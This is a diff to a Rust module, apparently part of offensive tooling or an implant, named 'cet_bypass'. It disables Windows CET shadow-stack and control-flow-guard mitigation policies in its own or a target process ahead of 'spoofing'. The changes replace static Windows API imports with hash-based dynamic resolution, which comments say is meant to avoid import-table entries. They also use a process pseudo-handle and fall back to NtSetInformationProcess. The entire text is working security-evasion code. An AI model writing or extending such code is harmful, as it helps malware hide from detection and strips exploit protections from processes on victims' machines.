@@ -45,7 +45,8 @@
 use std::sync::atomic::{AtomicBool, AtomicU8, Ordering};
 use once_cell::sync::OnceLock;
 
-use winapi::um::processthreadsapi::{GetProcessMitigationPolicy, GetCurrentProcess, SetProcessMitigationPolicy};
+// GetProcessMitigationPolicy/SetProcessMitigationPolicy/GetCurrentProcess removed
+// — using dynamic resolution via pe_resolve and pseudo-handle (-1)
 use winapi::um::winnt::{
     PROCESS_MITIGATION_POLICY, PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY,
     ProcessControlFlowGuardPolicy,
@@ -225,7 +226,7 @@ pub fn prepare_spoofing(target_handle: Option<HANDLE>) -> CetAction {
         CET_DISABLED => CetAction::Proceed,
         CET_ENABLED_CAN_DISABLE => {
             if PREFER_POLICY_DISABLE.load(Ordering::SeqCst) {
-                let handle = target_handle.unwrap_or_else(|| unsafe { GetCurrentProcess() });
+                let handle = target_handle.unwrap_or_else(|| (-1isize) as *mut _);
                 if disable_cet_for_process(handle) {
                     log::debug!("cet_bypass: CET disabled for target process via mitigation policy");
                     CetAction::Disabled
@@ -313,9 +314,34 @@ fn detect_cet_state() {
     // stacks are also active (they are tied together on Win11 24H2+).
     let mut cfg_policy = PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY { Flags: 0 };
 
+    // Resolve GetProcessMitigationPolicy dynamically to avoid IAT entry.
+    type FnGetProcessMitigationPolicy = unsafe extern "system" fn(
+        HANDLE, PROCESS_MITIGATION_POLICY, PVOID, SIZE_T,
+    ) -> BOOL;
+    let get_policy_fn: Option<FnGetProcessMitigationPolicy> = {
+        let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL);
+        match kernel32 {
+            Some(base) => {
+                let hash = pe_resolve::hash_str(b"GetProcessMitigationPolicy\0");
+                pe_resolve::get_proc_address_by_hash(base, hash)
+                    .map(|addr| unsafe { std::mem::transmute::<_, FnGetProcessMitigationPolicy>(addr as *mut _) })
+            }
+            None => None,
+        }
+    };
+
+    let get_policy_fn = match get_policy_fn {
+        Some(f) => f,
+        None => {
+            log::warn!("cet_bypass: failed to resolve GetProcessMitigationPolicy");
+            CET_STATE.store(CET_DISABLED, Ordering::SeqCst);
+            return;
+        }
+    };
+
     let result = unsafe {
-        GetProcessMitigationPolicy(
-            GetCurrentProcess(),
+        get_policy_fn(
+            (-1isize) as *mut _,
             ProcessControlFlowGuardPolicy,
             &mut cfg_policy as *mut _ as PVOID,
             std::mem::size_of::<PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY>() as SIZE_T,
@@ -367,9 +393,40 @@ fn can_disable_cet_policy() -> bool {
     // We test by trying to set the current policy (a no-op write).
     let mut current = PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY { Flags: 0 };
 
+    // Resolve APIs dynamically.
+    type FnGetPolicy = unsafe extern "system" fn(
+        HANDLE, PROCESS_MITIGATION_POLICY, PVOID, SIZE_T,
+    ) -> BOOL;
+    type FnSetPolicy = unsafe extern "system" fn(
+        PROCESS_MITIGATION_POLICY, PVOID, SIZE_T,
+    ) -> BOOL;
+
+    let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL);
+    let get_fn: Option<FnGetPolicy> = kernel32
+        .and_then(|base| {
+            let hash = pe_resolve::hash_str(b"GetProcessMitigationPolicy\0");
+            pe_resolve::get_proc_address_by_hash(base, hash)
+                .map(|addr| unsafe { std::mem::transmute::<_, FnGetPolicy>(addr as *mut _) })
+        });
+    let set_fn: Option<FnSetPolicy> = kernel32
+        .and_then(|base| {
+            let hash = pe_resolve::hash_str(b"SetProcessMitigationPolicy\0");
+            pe_resolve::get_proc_address_by_hash(base, hash)
+                .map(|addr| unsafe { std::mem::transmute::<_, FnSetPolicy>(addr as *mut _) })
+        });
+
+    let get_fn = match get_fn {
+        Some(f) => f,
+        None => return false,
+    };
+    let set_fn = match set_fn {
+        Some(f) => f,
+        None => return false,
+    };
+
     let result = unsafe {
-        GetProcessMitigationPolicy(
-            GetCurrentProcess(),
+        get_fn(
+            (-1isize) as *mut _,
             ProcessControlFlowGuardPolicy,
             &mut current as *mut _ as PVOID,
             std::mem::size_of::<PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY>() as SIZE_T,
@@ -383,7 +440,7 @@ fn can_disable_cet_policy() -> bool {
     // Try to set the policy back to its current value.
     // If this fails with ACCESS_DENIED, we cannot change CET.
     let set_result = unsafe {
-        SetProcessMitigationPolicy(
+        set_fn(
             ProcessControlFlowGuardPolicy,
             &current as *const _ as PVOID,
             std::mem::size_of::<PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY>() as SIZE_T,
@@ -412,7 +469,7 @@ fn can_disable_cet_policy() -> bool {
 ///
 /// Returns `true` if CET was successfully disabled.
 fn disable_cet_for_self() -> bool {
-    disable_cet_for_process(unsafe { GetCurrentProcess() })
+    disable_cet_for_process((-1isize) as *mut _)
 }
 
 /// Disable CET shadow stacks for a target process via
@@ -425,15 +482,34 @@ fn disable_cet_for_self() -> bool {
 ///
 /// Returns `true` if CET was successfully disabled.
 fn disable_cet_for_process(handle: HANDLE) -> bool {
-    let current_process = unsafe { GetCurrentProcess() };
-    let is_self = handle == current_process;
+    let current_process: HANDLE = (-1isize) as *mut _;
+    let is_self = handle == current_process || handle == ((-1isize) as *mut _);
 
     if is_self {
-        // Use the kernel32 API for the current process.
+        // Dynamically resolve SetProcessMitigationPolicy to avoid IAT entry.
+        type FnSetPolicy = unsafe extern "system" fn(
+            PROCESS_MITIGATION_POLICY, PVOID, SIZE_T,
+        ) -> BOOL;
+
+        let set_fn: Option<FnSetPolicy> = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
+            .and_then(|base| {
+                let hash = pe_resolve::hash_str(b"SetProcessMitigationPolicy\0");
+                pe_resolve::get_proc_address_by_hash(base, hash)
+                    .map(|addr| unsafe { std::mem::transmute::<_, FnSetPolicy>(addr as *mut _) })
+            });
+
+        let set_fn = match set_fn {
+            Some(f) => f,
+            None => {
+                log::warn!("cet_bypass: failed to resolve SetProcessMitigationPolicy, trying NtSetInformationProcess");
+                return disable_cet_nt(handle);
+            }
+        };
+
         let zero_policy = PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY { Flags: 0 };
 
         let result = unsafe {
-            SetProcessMitigationPolicy(
+            set_fn(
                 ProcessControlFlowGuardPolicy,
                 &zero_policy as *const _ as PVOID,
                 std::mem::size_of::<PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY>() as SIZE_T,
